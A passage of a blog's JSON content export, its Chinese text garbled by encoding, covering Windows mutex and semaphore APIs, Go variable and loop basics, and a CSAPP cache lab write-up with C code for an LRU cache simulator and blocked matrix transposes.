åˆ›å»ºçš„äº’æ–¥ä½“çš„åç§°ï¼Œå¦‚æœåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ä½¿ç”¨å¯ä»¥ä¸ºNULLï¼Œå¦‚æœåœ¨ä¸åŒè¿›ç¨‹ä¸­ä½¿ç”¨éœ€è¦èµ‹äºˆåç§° åœ¨å…¶ä»–è¿›ç¨‹ä¸­æ‰“å¼€äº’æ–¥ä½“12345HANDLE OpenMutexW( DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName); dwDesiredAccess äº’æ–¥ä½“å±äºå†…æ ¸å¯¹è±¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è®¾ç½®ä¸ºNULL bInheritHandle å¦‚æœæ­¤å€¼ä¸ºTRUEï¼Œåˆ™æ­¤è¿›ç¨‹åˆ›å»ºçš„è¿›ç¨‹å°†ç»§æ‰¿è¯¥å¥æŸ„ã€‚å¦åˆ™ï¼Œè¿›ç¨‹å°†ä¸ä¼šç»§æ‰¿æ­¤å¥æŸ„ lpName éœ€è¦æ‰“å¼€çš„äº’æ–¥ä½“çš„åç§° é‡Šæ”¾æŒ‡å®šäº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒ123BOOL ReleaseMutex( HANDLE hMutex); hMutex äº’æ–¥å¯¹è±¡çš„å¥æŸ„ã€‚è¯¥ CreateMutexæˆ–OpenMutexå‡½æ•°è¿”å›æ­¤å¥æŸ„ã€‚ ä¿¡å·é‡åˆ›å»ºä¿¡å·é‡123456HANDLE CreateSemaphoreW( LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCWSTR lpName); lpSemaphoreAttributes äº’æ–¥ä½“å±äºå†…æ ¸å¯¹è±¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è®¾ç½®ä¸ºNULL lInitialCount ä¿¡å·é‡å¯¹è±¡çš„åˆå§‹è®¡æ•°ã€‚æ­¤å€¼å¿…é¡»å¤§äºæˆ–ç­‰äºé›¶ä¸”å°äºæˆ–ç­‰äºlMaximumCountã€‚å½“ä¿¡å·é‡çš„è®¡æ•°å¤§äºé›¶æ—¶ï¼Œå°†å‘å‡ºä¿¡å·çŠ¶æ€ï¼›åœ¨ä¿¡å·é‡ä¸ºé›¶æ—¶ï¼Œå°†ä¸å‘å‡ºä¿¡å·çŠ¶æ€ã€‚æ¯å½“ç­‰å¾…å‡½æ•°é‡Šæ”¾ç­‰å¾…ä¿¡å·é‡çš„çº¿ç¨‹æ—¶ï¼Œè®¡æ•°å°±ä¼šå‡å°‘ä¸€ã€‚é€šè¿‡è°ƒç”¨ReleaseSemaphoreå‡½æ•°å°†è®¡æ•°å¢åŠ æŒ‡å®šçš„æ•°é‡ ã€‚ lMaximumCount ä¿¡å·é‡å¯¹è±¡çš„æœ€å¤§è®¡æ•°ã€‚è¯¥å€¼å¿…é¡»å¤§äºé›¶ã€‚ lpName åˆ›å»ºçš„ä¿¡å·é‡åç§°ï¼Œå¯ä»¥NULL é‡Šæ”¾ç­‰å¾…ä¿¡å·é‡12345BOOL ReleaseSemaphore( HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount); hSemaphore ä¿¡å·é‡å¯¹è±¡çš„å¥æŸ„ã€‚è¯¥ CreateSemaphoreæˆ– OpenSemaphoreå‡½æ•°è¿”å›è¯¥å¥æŸ„ã€‚ lReleaseCount ä¿¡å·é‡å¯¹è±¡çš„å½“å‰è®¡æ•°è¦å¢åŠ çš„æ•°é‡ã€‚è¯¥å€¼å¿…é¡»å¤§äºé›¶ã€‚å¦‚æœæŒ‡å®šçš„æ•°é‡å°†å¯¼è‡´ä¿¡å·é‡çš„è®¡æ•°è¶…è¿‡åˆ›å»ºä¿¡å·é‡æ—¶æŒ‡å®šçš„æœ€å¤§è®¡æ•°ï¼Œåˆ™è¯¥è®¡æ•°ä¸ä¼šæ›´æ”¹ï¼Œå‡½æ•°å°†è¿”å›FALSEã€‚ lpPreviousCount æŒ‡å‘å˜é‡çš„æŒ‡é’ˆï¼Œä»¥æ¥æ”¶ä¿¡å·é‡çš„å…ˆå‰è®¡æ•°ã€‚å¦‚æœä¸éœ€è¦ä¸Šä¸€ä¸ªè®¡æ•°ï¼Œåˆ™æ­¤å‚æ•°å¯ä»¥ä¸ºNULLã€‚"},{"title":"goï¼ˆå˜é‡ç±»å‹ä¸å£°æ˜æ–¹å¼ï¼Œå¾ªç¯ï¼‰","date":"2021-08-08T09:27:36.392Z","updated":"2021-08-08T09:27:36.392Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/go/GoStudy-1.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/go/GoStudy-1.html","excerpt":"","text":"å‘½ä»¤xxxä»£è¡¨æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ åªè¿è¡Œä¸ç¼–è¯‘ 1go run xxx ç¼–è¯‘æ–‡ä»¶ 1go build xxx ç”Ÿæˆå·¥ç¨‹é¡¹ç›® 1go install å°çŸ¥è¯†ç‚¹ goè¯­è¨€ä¸­æ¯ä¸€ä¸ªå·¥ç¨‹é¡¹ç›®éƒ½éœ€è¦æœ‰ä¸€ä¸ªmainåŒ…ï¼Œè¿™ä¸ªåŒ…ä¸­çš„mainå‡½æ•°æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ 1package main goè¯­è¨€ä¸­å‡½æ•°çš„èŠ±æ‹¬å·çš„å‰æ‹¬å·ä¸èƒ½å•ç‹¬ä¸€è¡Œ âœ” 123 func main() &#123;defer fmt.Println(&quot;Hello World&quot;) &#125; âŒ 1234 func main() &#123;defer fmt.Println(&quot;Hello World&quot;) &#125; goè¯­è¨€ä¸­å£°æ˜çš„å˜é‡å¿…é¡»ä½¿ç”¨ï¼Œå¦åˆ™æŠ¥é”™ GOPATH,GOROOTçš„å…³ç³» å˜é‡ï¼ˆå¸¸é‡ï¼‰çš„å£°æ˜å’Œèµ‹å€¼ æ ‡å‡†å£°æ˜ï¼ˆå…ˆå£°æ˜åœ¨èµ‹å€¼ï¼‰12var variable_name int //variable_typevariable_name = 10 ç®€åŒ–å£°æ˜ï¼Œè‡ªåŠ¨æ¨å¯¼ç±»å‹1variable_name := 10 å¤šé‡å£°æ˜12//ç›¸åŒç±»å‹var a, b, c int 1234567//ä¸åŒç±»å‹å…ˆå£°æ˜åèµ‹å€¼ var( a int b float32)a = 10b = 1.1 12345//å£°æ˜æ—¶èµ‹å€¼var( a int = 10 b float32 = 1.1) 12//ç®€åŒ–å†™æ³•var a, b = 1, 1.1 12//è‡ªåŠ¨æ¨å¯¼ç±»å‹a, b, c := 1, 1.1, &quot;Tom&quot; åŒ¿åå˜é‡goè¯­è¨€ä¸­å­˜åœ¨åŒ¿åå˜é‡ï¼Œç”¨ä¸‹åˆ’çº¿è¡¨ç¤ºï¼Œå¤šç”¨äºæ¥å—å‡½æ•°è¿”å›å€¼æ—¶ä½¿ç”¨ï¼Œä¾‹å­1234567891011121314package mainimport ( &quot;fmt&quot;)func anon_var() (a, b, c int) &#123; return 1, 2, 3&#125;func main() &#123; a, _, c := anon_var() fmt.Println(a, c)&#125; ä¸Šé¢ä»£ç anon_varå‡½æ•°è¿”å›ä¸‰ä¸ªå€¼ï¼Œä½†æ˜¯æˆ‘åªæƒ³æ¥æ”¶ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªï¼Œå°±æ˜¯ç”¨åŒ¿åå˜é‡æ¥å¿½ç•¥ç¬¬äºŒä¸ªè¿”å›å€¼ iotaæšä¸¾iotaæ˜¯goè¯­è¨€ä¸­çš„å¸¸é‡è®¡æ•°å™¨ï¼Œåªèƒ½ä½œç”¨äºå¸¸é‡constï¼Œä¾‹å­å¦‚ä¸‹ 123456const ( a1 = iota a2 = iota a3 = iota )fmt.Println(a1, a2, a3) 123456//ç®€åŒ–å†™æ³•const ( a1 = iota a2 a3 ) å¾ªç¯goè¯­è¨€ä¸­å¾ªç¯åªæœ‰ä¸€ç§æ–¹å¼ï¼Œfor(rangeç®—è¿­ä»£çš„è¯)ï¼Œä¸‹é¢è´´ä½¿ç”¨æ–¹æ³• ä¸åŠ ä»»ä½•æ¡ä»¶ï¼šæ— çº¿å¾ªç¯ï¼Œé™¤éä½¿ç”¨breakè·³å‡ºå¾ªç¯ 12345func main() &#123; for &#123; fmt.Println(&quot;fish&quot;) &#125;&#125; æ™®é€šä½¿ç”¨æ–¹æ³•ï¼šä¸cè¯­è¨€æ ¼å¼ç±»ä¼¼ 12345func main() &#123; for i := 0; i &lt; 10; i++ &#123; fmt.Println(i) &#125;&#125; ä¸whileå¾ªç¯æ ¼å¼ç±»ä¼¼çš„å†™æ³• 12345678910111213func main() &#123; sum := 1 for ; sum &lt;= 10; &#123; sum += sum &#125; fmt.Println(sum) // è¿™æ ·å†™ä¹Ÿå¯ä»¥ï¼Œæ›´åƒ While è¯­å¥å½¢å¼ for sum &lt;= 10&#123; sum += sum &#125; fmt.Println(sum)&#125; ä¸rangeä¸€èµ·ä½¿ç”¨ 12345678//iä»£è¡¨ä¸‹è¡¨ï¼Œdataä»£è¡¨æ•°æ®func main() &#123; str := &quot;Hello Go&quot; for i, data := range str &#123; fmt.Println(i, data) &#125;&#125;"}],"posts":[{"title":"cache lab","slug":"csapp_cachelab","date":"2022-03-09T16:02:08.203Z","updated":"2022-03-09T16:06:12.656Z","comments":true,"path":"2344/","link":"","permalink":"http://example.com/2344/","excerpt":"","text":"å‰è¨€è¿™ç« ä»çœ‹è§†é¢‘åˆ°çœ‹ä¹¦å†åˆ°åšlabç”¨äº†å°ä¸€ä¸ªæ˜ŸæœŸçš„æ—¶é—´ï¼Œåšå¾—æ€€ç–‘æ™ºå•†ï¼Œcachelabä¸­çš„PartBéƒ¨åˆ†åªèƒ½å‹‰å¼ºææ‡‚ï¼Œè¿˜å¾—çœ‹ç½‘ä¸Šå¤§ä½¬çš„æ€è·¯ï¼Œç®—äº†ä¸å°‘è‰ç¨¿æ‰å‹‰å¼ºå°†missæ¬¡æ•°ç»™ç®—å‡ºæ¥ï¼Œçœ‹åˆ°åé¢è¿˜æœ‰æ›´éš¾çš„labå·²ç»å¼€å§‹å®³æ€•äº†ã€‚ç”±äºæ—¶é—´é—®é¢˜ï¼Œè¿™ä¸ªlabæ²¡æœ‰ç ”ç©¶åˆ°æ»¡åˆ†ï¼ˆåŠæ ¼éƒ½å¤Ÿå‘›ï¼‰ å®éªŒæ–‡ä»¶ä»‹ç»1234567891011121314151617â”œâ”€â”€ cachelab.câ”œâ”€â”€ cachelab.hâ”œâ”€â”€ csim.câ”œâ”€â”€ csim-refâ”œâ”€â”€ driver.pyâ”œâ”€â”€ Makefileâ”œâ”€â”€ READMEâ”œâ”€â”€ test-csimâ”œâ”€â”€ test-trans.câ”œâ”€â”€ tracegen.câ”œâ”€â”€ tracesâ”‚ â”œâ”€â”€ dave.traceâ”‚ â”œâ”€â”€ long.traceâ”‚ â”œâ”€â”€ trans.traceâ”‚ â”œâ”€â”€ yi2.traceâ”‚ â””â”€â”€ yi.traceâ””â”€â”€ trans.c csim.cå’Œtrans.cæ–‡ä»¶ï¼Œå‰ä¸€ä¸ªæ–‡ä»¶æ˜¯éœ€è¦æˆ‘ä»¬å®ç°ä¸€ä¸ªç¼“å­˜æ¨¡æ‹Ÿå™¨ï¼Œç¬¬äºŒä¸ªæ˜¯å®ç°çŸ©é˜µè½¬ç½® test-csimæ–‡ä»¶ï¼šæµ‹è¯•æˆ‘ä»¬å†™çš„ç¼“å­˜æ¨¡æ‹Ÿå™¨ csim-refï¼šæˆ‘ä»¬æ‰€å†™çš„ç¼“å­˜æ¨¡æ‹Ÿå™¨æ ·ä¾‹ï¼Œè¦æ±‚å’Œè¿™ä¸ªä¸€æ¨¡ä¸€æ · test-trans.cï¼šåœ¨ç¼–è¯‘è¿‡åæµ‹è¯•çŸ©é˜µ driver.pyï¼šå½“æ‰€æœ‰éƒ¨åˆ†éƒ½å®Œæˆåè®¡ç®—å‡ºæ‰€å¾—åˆ†æ•° cachelab Part Aè¿™ä¸€å…³è®©æˆ‘ä»¬å†™ä¸€ä¸ªç¼“å­˜æ¨¡æ‹Ÿå™¨ï¼ˆé«˜çº§å­¦ç”Ÿç®¡ç†ç³»ç»Ÿï¼‰ï¼Œåœ¨è¿›è¡Œç»„å†…è¡Œç½®æ¢æ—¶ä½¿ç”¨LRUç®—æ³•ã€‚æ¯”è¾ƒç®€å•ï¼Œè¯´ä¸‹cacheçš„æ•°æ®ç»“æ„å’Œå…³é”®ä»£ç å°±è¡Œï¼Œå®Œæ•´ä»£ç æ”¾åœ¨äº†github 123456// cacheç»“æ„ä½“å®šä¹‰typedef struct Cache &#123; CacheLinkList **linkListArr; CacheInfo *cacheInfo; U64 *cacheLineCount;&#125;Cache; ç»“æ„ä½“ä¸­ä½¿ç”¨äº†ä¸€ä¸ªæ•°ç»„æŒ‡é’ˆè®°å½•äº†æ¯ä¸€ç»„çš„å¤´èŠ‚ç‚¹ï¼ŒCacheInfoè®°å½•äº†cacheçš„åŸºæœ¬æ•°æ®ï¼Œåœ¨å®šä¹‰ä¸€ä¸ªæ•°ç»„è®°å½•æ¯ä¸€ç»„è¡Œå¥½ä½¿ç”¨LRUç®—æ³•è¿›è¡Œé¡µé¢ç½®æ¢ï¼Œæ¯ä¸€ç»„çš„ä½¿ç”¨äº†åŒå‘é“¾è¡¨æ¥è¿›è¡Œé“¾æ¥ã€‚ 123456789101112131415161718//cacheå‰©ä½™ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹typedef struct CacheInfo &#123; U64 sets; U64 lines; U64 blockSize;&#125;CacheInfo;typedef struct CacheLinkList &#123; CacheLine *cacheLine; struct CacheLinkList *prev; struct CacheLinkList *next;&#125;CacheLinkList;typedef struct CacheLine &#123; U64 sign; U64 tag; U8 *block;&#125; CacheLine; æˆ‘è¿˜å°†ä»æ–‡ä»¶è¯»å–çš„åœ°å€ä¹Ÿæ”¾åœ¨äº†ç»“æ„ä½“ä¸­ï¼Œåœ°å€éƒ¨åˆ†çš„ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ 1234567891011121314151617181920//å­˜æ”¾åœ°å€çš„ç»“æ„ä½“å®šä¹‰typedef struct AddInfo &#123; //address mark struct U64 t; U64 s; U64 b;&#125; AddInfo;typedef struct Address &#123; char op; U64 add; U64 size; AddInfo *addInfo;&#125; Address;typedef struct AddLinkList &#123; Address *address; struct AddLinkList *prev; struct AddLinkList *next;&#125;AddLinkList; åœ¨è®¡ç®—æ˜¯å¦å‘½ä¸­æ—¶ï¼Œä½¿ç”¨å¦‚ä¸‹æ€è·¯ï¼Œé¦–å…ˆåˆ¤æ–­å­˜æ”¾ç»„é“¾è¡¨è¡¨å¤´çš„åœ°å€æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºå°±æ·»åŠ ç„¶åè¿”å›MISS 12345678910111213141516CacheLinkList *head = cache-&gt;linkListArr[set]; // first match if success return hit if (head == 0) &#123; head = (CacheLinkList*) malloc(sizeof(CacheLinkList)); cache-&gt;linkListArr[set] = head; CacheLine* cacheLine = (CacheLine*)malloc(sizeof(CacheLine)); head-&gt;cacheLine = cacheLine; head-&gt;next = 0; head-&gt;prev = 0; head-&gt;cacheLine-&gt;sign = 1; head-&gt;cacheLine-&gt;tag = tag; head-&gt;cacheLine-&gt;block = 0; cache-&gt;cacheLineCount[set]++; return MISS; &#125; å¦‚æœè¡¨å¤´ä¸ä¸ºç©ºï¼Œå°±éå†è¿™ä¸ªåŒå‘é“¾è¡¨ï¼Œåˆ¤æ–­tagæ˜¯å¦åŒ¹é…ï¼Œå¦‚æœåŒ¹é…åˆ°tagï¼Œå°±åˆ¤æ–­è¿™ä¸ªèŠ‚ç‚¹æ˜¯å¤´èŠ‚ç‚¹ï¼Œå°¾èŠ‚ç‚¹ï¼Œæˆ–è€…ä¸­é—´çš„èŠ‚ç‚¹ï¼Œç„¶åå°†è¿™ä¸ªå‘½ä¸­çš„èŠ‚ç‚¹å˜æˆè¡¨å¤´èŠ‚ç‚¹ï¼Œè¿”å›HITã€‚ 12345678910111213141516171819202122232425262728while(node != 0) &#123; if(node-&gt;cacheLine-&gt;tag == tag) &#123; if (node-&gt;prev == 0) &#123; // first node cache-&gt;linkListArr[set] = node; &#125; else if (node-&gt;next == 0) &#123; // last node lastNode = node-&gt;prev; lastNode-&gt;next = 0; head-&gt;prev = node; node-&gt;next = head; node-&gt;prev = 0; cache-&gt;linkListArr[set] = node; &#125; else &#123; node-&gt;prev-&gt;next = node-&gt;next; node-&gt;next-&gt;prev = node-&gt;prev; head-&gt;prev = node; node-&gt;next = head; node-&gt;prev = 0; cache-&gt;linkListArr[set] = node; &#125; return HIT; &#125; lastNode = node; node = node-&gt;next; &#125; å¦‚æœåœ¨ä¾¿åˆ©é“¾è¡¨æ—¶æ²¡æœ‰å‘½ä¸­tagï¼Œå°±åˆ¤æ–­è¿™ä¸ªç»„ä¸­çš„lineæ˜¯å¦å·²ç»æ»¡å‘˜ï¼Œå¦‚æœä¸æ»¡å‘˜ï¼Œå°±æ·»åŠ ä¸€ä¸ªæ–°èŠ‚ç‚¹ä¸ºè¡¨å¤´ï¼Œè¿”å›MISS 123456789101112131415if (lineCount &lt; lines) &#123; // add to link list last newNode = (CacheLinkList*)malloc(sizeof(CacheLinkList)); CacheLine* cacheLine = (CacheLine*)malloc(sizeof(CacheLine)); newNode-&gt;cacheLine = cacheLine; newNode-&gt;cacheLine-&gt;sign = 1; newNode-&gt;cacheLine-&gt;tag = tag; newNode-&gt;next = head; newNode-&gt;prev = 0; head-&gt;prev = newNode; cache-&gt;linkListArr[set] = newNode; cache-&gt;cacheLineCount[set]++; return MISS; &#125; å¦‚æœç»„ä¸­æ»¡å‘˜ï¼Œå°±åˆ é™¤æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œç„¶åæ·»åŠ æ–°èŠ‚ç‚¹ 12345678910111213141516171819202122newNode = (CacheLinkList*) malloc(sizeof(CacheLinkList)); CacheLine* cacheLine = (CacheLine*)malloc(sizeof(CacheLine)); memset(newNode, 0, sizeof (CacheLinkList)); memset(cacheLine, 0, sizeof(CacheLine)); newNode-&gt;cacheLine = cacheLine; newNode-&gt;cacheLine-&gt;tag = tag; if (lastNode-&gt;prev == 0) &#123; cache-&gt;linkListArr[set] = newNode; free(lastNode-&gt;cacheLine); free(lastNode); &#125; else &#123; lastNode = lastNode-&gt;prev; free(lastNode-&gt;next-&gt;cacheLine); free(lastNode-&gt;next); lastNode-&gt;next = 0; newNode-&gt;next = head; newNode-&gt;prev = 0; head-&gt;prev = newNode; cache-&gt;linkListArr[set] = newNode; &#125; æœ€åç»“æœå¦‚ä¸‹å›¾ cachelab Part Bé¦–å…ˆè¿™ä¸€å…³çš„è¦æ±‚æ˜¯æœ€å¤šä½¿ç”¨12ä¸ªå±€éƒ¨å˜é‡ï¼Œå¹¶ä¸”ä¸èƒ½ä½¿ç”¨æ•°æ®æˆ–è€…mallocå‡½æ•°ç”³è¯·å†…å­˜æ¥å­˜æ”¾çŸ©é˜µä¸­çš„å€¼ï¼Œè¿˜ä¸èƒ½ä½¿ç”¨é€’å½’ç®—æ³• å®ç°ä¸€ä¸ªé«˜hitä½missçš„çŸ©é˜µè½¬ç½®ï¼Œè¿™ä¸€éƒ¨åˆ†å¾ˆè€ƒéªŒæƒ³è±¡åŠ›ã€‚ç”±äºæµ‹è¯•ç”¨çš„çŸ©é˜µå¤ªå¤§ä¸å¥½ç”»å›¾ï¼Œå°±å…ˆç”¨4*4çš„çŸ©é˜µè®²è§£ï¼Œé¦–å…ˆæ”¾ä¸¤ä¸ªä¸åŒçš„çŸ©é˜µè½¬ç½®ä»£ç å’Œä»–ä»¬çš„å‘½ä¸­ç‡ã€‚ 123456789//é«˜å‘½ä¸­ç‡è½¬ç½®ä»£ç int i, j, k, l;int v1, v2, v3, v4, v5, v6, v7, v8;for (i = 0; i &lt; N; i+=2) &#123; v1 = A[i][0];v2 = A[i][1];v3 = A[i][2];v4 = A[i][3]; v5 = A[i+1][0];v6 = A[i+1][1];v7 = A[i+1][2];v8 = A[i+1][3]; B[0][i] = v1;B[1][i] = v2;B[2][i] = v3;B[3][i] = v4; B[0][i+1] = v5;B[1][i+1] = v6;B[2][i+1] = v7;B[3][i+1] = v8; &#125; 123456789//ä½å‘½ä¸­ç‡è½¬ç½®ä»£ç int i, j, tmp; for (i = 0; i &lt; N; i++) &#123; for (j = 0; j &lt; M; j++) &#123; tmp = A[i][j]; B[j][i] = tmp; &#125; &#125; ä»–ä»¬ä¸¤ä¸ªçš„æ•ˆç‡ç›¸å·®å¦‚ä¸‹ è¿™é‡Œä½¿ç”¨ç¼“å­˜æ˜¯(s, E, b) -&gt; (5, 1, 5)ï¼Œæ‰€ä»¥ä¸€å…±æœ‰32ç»„ï¼Œæ¯ç»„æœ‰ä¸€åˆ—ç¼“å­˜ï¼Œæ¯åˆ—ç¼“å­˜å¯ä»¥å­˜æ”¾çš„å­—èŠ‚å¤§å°ä¸º32 è¯´ä¸‹è¿™8æ¬¡misså’Œ21æ¬¡missæ˜¯æ€ä¹ˆæ¥çš„å§ï¼Œå…ˆè¯´æ™®é€šçš„22æ¬¡ï¼Œè¿™22æ¬¡ä¸­æœ‰3æ¬¡æ˜¯ç³»ç»Ÿmissï¼Œè¿™æ˜¯æ— æ³•é¿å…çš„ã€‚å‰©ä¸‹å°±è¿˜æœ‰19æ¬¡MISSï¼ŒçŸ©é˜µä¸­çš„HITä¸MISSåˆ†å¸ƒå›¾å¦‚ä¸‹ã€‚ ä¸Šé¢çŸ¥é“ä¸€ä¸ªå—æœ€å¤šæœ‰32ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±èƒ½å®¹çº³8ä¸ªintå‹æ•´æ•°ï¼Œæ‰€ä»¥åœ¨4*4çš„çŸ©é˜µä¸­Aå’ŒBçš„å‰ä¸¤æ’éƒ½æ˜¯æ˜ å°„åˆ°åŒä¸€ä¸ªç»„ä¸­ï¼Œæ‰€ä»¥ä¼šé€ æˆè¿™ä¸ªæƒ…å†µã€‚åœ¨ä¼˜åŒ–ä»¥åï¼Œå½“AæŠŠçŸ©é˜µä¸­çš„ä¸¤æ’ä¹Ÿå°±æ˜¯8ä¸ªintæ•°æ®è¯»å…¥ç¼“å­˜æ—¶ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨å±€éƒ¨å˜é‡å°†ä»–è¯»å‡ºæ¥ï¼Œè¿™æ ·å°±å‡å°‘äº†ç¼“å­˜ä¸­çš„æ•°æ®ä¸€ç›´åœ¨Aå’ŒBä¹‹é—´äº¤æ¢çš„æƒ…å†µï¼Œå¤§å¤§æé«˜äº†ç¼“å­˜å‘½ä¸­ç‡ã€‚ ä¼˜åŒ–åçš„è½¬ç½®AçŸ©é˜µåªæœ‰2æ¬¡ MISSï¼ŒBçŸ©é˜µæœ‰3æ¬¡MISSï¼ŒåŠ ä¸Šç³»ç»Ÿçš„3æ¬¡MISSï¼Œä¸€å…±å°±æ˜¯8æ¬¡MISSã€‚ 32 x 32ä¸€è¡Œæœ‰32ä¸ªintå‹æ•°æ®ï¼Œå‡è®¾å°†ç¼“å­˜ä¸­çš„æ•°æ®å…¨éƒ¨å¡«æ»¡ï¼Œéœ€è¦8è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªçŸ©é˜µä¸­å¹³å‡8è¡Œé€ æˆä¸€æ¬¡ç»„æ˜ å°„å†²çªã€‚è¿™é‡Œé‡‡ç”¨ä¸€ç§åˆ†å¿«æŠ€æœ¯ï¼Œå°†ä¸€ä¸ª32 x 32çš„çŸ©é˜µï¼Œåˆ†æˆ16ä¸ª8 x 8çš„çŸ©é˜µï¼Œç„¶åä½¿ç”¨åœ¨4 x 4çŸ©é˜µä¸­æ‰€ä½¿ç”¨çš„æŠ€æœ¯ï¼šæ¯è®¿é—®ä¸€æ¬¡çŸ©é˜µAï¼Œå°±å°†ç¼“å­˜ä¸­Açš„å†…å®¹å…¨éƒ¨è¯»å–åˆ°å±€éƒ¨å˜é‡ä¸­ã€‚ 1234567891011121314151617181920212223242526int i, j, k, l;int v1, v2, v3, v4, v5, v6, v7, v8; if (N == 32) &#123; for (i = 0; i &lt; N; i += 8) &#123; for (j = 0; j &lt; M; j += 8) &#123; for (k = i; k &lt; i + 8; ++k) &#123; v1 = A[k][j + 0]; v2 = A[k][j + 1]; v3 = A[k][j + 2]; v4 = A[k][j + 3]; v5 = A[k][j + 4]; v6 = A[k][j + 5]; v7 = A[k][j + 6]; v8 = A[k][j + 7]; B[j + 0][k] = v1; B[j + 1][k] = v2; B[j + 2][k] = v3; B[j + 3][k] = v4; B[j + 4][k] = v5; B[j + 5][k] = v6; B[j + 6][k] = v7; B[j + 7][k] = v8; &#125; &#125; &#125; &#125; è¿™æ ·å°±å¯ä»¥å¤§é‡çš„å‡å°‘MISSæ¬¡æ•°ï¼Œè¿™ç§æ–¹æ³•ç†è®ºä¸Šæœ€å°‘çš„MISSæ¬¡æ•°æ˜¯256æ¬¡ï¼Œä½†æ˜¯ç”±äºçŸ©é˜µå¯¹è§’çº¿ä½ç½®çš„å—ä¼šé€ æˆç»„å†²çªï¼Œæ‰€ä»¥å¯¹è§’çº¿å¤„çš„åˆ†çš„å››ä¸ªå—ï¼Œæ¯ä¸€ä¸ªå¿«ä¼šå¤š7æ¬¡ï¼Œä¹Ÿå°±æ˜¯256+7x4=284æ¬¡ï¼ŒåŠ ä¸Šç³»ç»Ÿçš„4æ¬¡missï¼Œå°±æ˜¯æˆ‘ä»¬å¾—åˆ°çš„288æ¬¡ 64 x 64è¯´å®è¯è¿™ä¸€å…³æ¯”è¾ƒéš¾ï¼Œæƒ³åˆ°äº†æ»¡åˆ†çš„åŠæ³•ä½†æ˜¯ä¸æƒ³å»å®ç°äº†ï¼Œç¼“ä¸€ç¼“å‡‘åˆç€è¿‡å…ˆã€‚ã€‚ã€‚ã€‚ è¿˜æ˜¯å…ˆå‡è®¾å°†ç¼“å­˜å…¨éƒ¨å¡«æ»¡éœ€è¦å¤šå°‘è¡Œï¼Œåœ¨64çš„çŸ©é˜µä¸­åªéœ€è¦4è¡Œï¼Œæ‰€ä»¥å¦‚æœåœ¨ä½¿ç”¨8 x 8çš„å°çŸ©é˜µåˆ†å—çš„è¯åœ¨åˆ†å—çŸ©é˜µä¸­éƒ½ä¼šé€ æˆç»„é—´å†²çªï¼Œæ‰€ä»¥é€€è€Œæ±‚å…¶æ¬¡ä½¿ç”¨4 x 4çš„çŸ©é˜µåˆ†å—ï¼Œè¿™æ ·åšçš„åå¤„å°±æ˜¯æ²¡æœ‰å……åˆ†åˆ©ç”¨ç¼“å­˜ï¼Œä¹‹ä½¿ç”¨äº†ç¼“å­˜å—çš„ä¸€åŠå†…å®¹ï¼Œæ˜¯è¾¾ä¸åˆ°æ»¡åˆ†çš„ï¼Œæ­£ç¡®çš„åšæ³•æ˜¯å…ˆåˆ†æˆ8 x 8çš„çŸ©é˜µï¼Œåœ¨ä½¿ç”¨ä¸€æ¬¡åˆ†å—æŠ€æœ¯å°†8 x 8çš„çŸ©é˜µåˆ†æˆ4ä¸ª4 x 4çš„çŸ©é˜µç„¶åè¿›è¡Œè½¬ç½®ï¼Œå½“ç„¶è¿™ä¸­é—´çš„è¿‡ç¨‹æœ‰äº›å¤æ‚æˆ‘å°±ä¸æƒ³åœ¨è¯´äº†ï¼ˆå‰é¢çš„è¿™äº›ä¸œè¥¿ææ‡‚éƒ½èŠ±äº†ä¸€å¤©è„‘è¢‹è¦ç‚¸äº†ï¼‰ã€‚ç›´æ¥çœ‹4 x 4çŸ©é˜µåˆ†å—ã€‚ 12345678910111213141516171819 int i, j, k, l; int v1, v2, v3, v4, v5, v6, v7, v8;if (N == 64) &#123; for (i = 0; i &lt; N; i += 4) &#123; for (j = 0; j &lt; M; j += 4) &#123; for (k = i; k &lt; i + 4; ++k) &#123; v1 = A[k][j+0]; v2 = A[k][j+1]; v3 = A[k][j+2]; v4 = A[k][j+3]; B[j+0][k] = v1; B[j+1][k] = v2; B[j+2][k] = v3; B[j+3][k] = v4; &#125; &#125; &#125; &#125; 61 x 67è¿™ä¸ªè¯´å®è¯æ²¡æœ‰åœ¨ç»†ç»†çš„å»è®¡ç®—å»æƒ³äº†ï¼Œéæ­£æ–¹å½¢çŸ©é˜µæœ€å¥½çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨å¤šä¸ªå€¼å»æµ‹è¯•ï¼Œç„¶åé€‰å‡ºä¸€ä¸ªæœ€ä¼˜è§£ï¼Œè¿™é‡Œçš„æœ€ä¼˜è§£æ³•æ˜¯åˆ†ä¸º17 x 17çš„çŸ©é˜µã€‚MISSç‡åœ¨1950å·¦å³ 123456789101112if (N == 67) &#123; for (i = 0; i &lt; N; i += 17) &#123; for (j = 0; j &lt; M; j += 17) &#123; for (k = i; k &lt; N &amp;&amp; k &lt; i + 17; ++k) &#123; for (l = j; l &lt; M &amp;&amp; l &lt; j + 17; ++l) &#123; v1 = A[k][l]; B[l][k] = v1; &#125; &#125; &#125; &#125; &#125; 